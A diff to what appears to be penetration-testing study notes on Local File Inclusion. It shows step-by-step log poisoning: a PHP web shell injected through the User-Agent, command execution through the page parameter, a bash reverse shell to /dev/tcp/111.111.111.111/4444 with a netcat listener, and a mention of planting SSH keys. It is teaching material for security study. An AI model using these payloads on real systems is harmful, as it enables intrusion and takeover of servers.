@@ -101,7 +101,7 @@ curl http://111.111.111.111/cgi-bin/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd
 
 ## File Inclusion Vulnerabilities
 
-# Local File Inclusion (LFI)
+### Local File Inclusion (LFI)
 
 Firstly, mixing up a File Inclusion vuln with a Directory Traversal vuln can result in us missing an opportunity to execute arbitrary code!
 
@@ -111,4 +111,68 @@ File Inclusion allows us to "include" a file in the app's running code, which me
 
 If we exploit a Directory Traversal vuln on the admin.php file, we'll see the source code. However, if we exploit a File Inclusion vuln, we'll have admin.php executed.
 
-Our goal is to conduct Remote Code Execution (RCE) via a Local File Inclusion vuln, and we will do this with Log Poisoning, which modifies data we send to a webapp so the logs contain executable code.
+Our goal is to conduct Remote Code Execution (RCE) via a Local File Inclusion vuln, and we will do this with Log Poisoning, which modifies data we send to a webapp so the logs contain executable code. To learn where we control input, we can either read the Apache web server documentation or display the file with LFI.
+
+We can use curl to display the Apache access.log to see the elements that comprise a log entry.
+
+```console
+$ curl http://website.com/customer/index.php?page=../../../../../../../../../var/log/apache2/access.log
+
+...
+192.168.50.1 - - [12/Apr/2022:10:34:55 +0000] "GET /customer/index.php?page=admin.php HTTP/1.1" 200 2218 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0"
+...
+```
+
+It appears, in this case, that the User Agent is part of the log entry. With Burp, we can modify the User Agent to specify what will be written in the access.log to be executed.
+
+After navigating to your target page, go to HTTP History and send the request to Repeater. Modify the User Agent field with some PHP code:
+
+```html
+User-Agent: Mozilla/5.0 <?php echo system($_GET['cmd']); ?>
+```
+
+To execute this, we need to update the page parameter in the current Burp request with a relative path and a cmd parameter, as seen below. Don't forget to remove the User Agent line to avoid multiple executions.
+
+```html
+GET /customer/index.php?page=../../../../../../../../../../var/log/apache2/access.log&cmd=ps HTTP/1.1
+```
+
+In the Response section, you will see the output of the executed ps command. If we update the command to ls -la, we will trigger an error, because of the space between the command and the flags! There's a few options for getting around this, like URL encoding or Input Field Separators (IFS). We will use URL encoding:
+
+```html
+GET /customer/index.php?page=../../../../../../../../../../var/log/apache2/access.log&cmd=ls%20-la HTTP/1.1
+```
+
+If this works, we have achieved command execution! We can leverage this to gain reverse shell. Or, we can try to add our SSH key to the authorized_keys file for a user.
+
+Let's first try for a reverse shell:
+
+```html
+GET /customer/index.php?page=../../../../../../../../../../var/log/apache2/access.log&cmd=bash -i >& /dev/tcp/111.111.111.111/4444 0>&1 HTTP/1.1
+```
+
+We will be executing this via the PHP system function, and it may be executed with the Bourne Shell (sh) instead of Bash. This one-liner above contains syntax that Bourne Shell does not support. To fix this, we need nee to ensure the shell is executed with Bash. Let's provide the command an argument to bash -c.
+
+```html
+GET /customer/index.php?page=../../../../../../../../../../var/log/apache2/access.log&cmd=bash -c "bash -i >& /dev/tcp/111.111.111.111/4444 0>&1" HTTP/1.1
+
+// URL Encode!
+
+GET /customer/index.php?page=../../../../../../../../../../var/log/apache2/access.log&cmd=bash%20-c%20%22bash%20-i%20%3E%26%20%2Fdev%2Ftcp%111.111.111.111%2F4444%200%3E%261%22
+```
+
+Now, before sending this, let's start a netcat listener on 4444.
+
+```console
+$ nc -nvlp 4444
+```
+
+Send your request in Burp. If successful, we have a reverse shell!
+
+### LFI in Windows
+
+The PHP code we used previously works in Windows, since the PHP system functionis independent from the OS. When Log Poisoning on Windows, we should know that the log files are in app-specific paths. For example, a target running XAMPP has logs in C:\xampp\apache\logs\.
+
+We can also similarly exploit RFI and LFI on frameworks like Perl, Active Server Pages Extended, Active Server Pages, Java Server Pages, and Node.js. We can simply adjust this exploit for different languages.
+
+
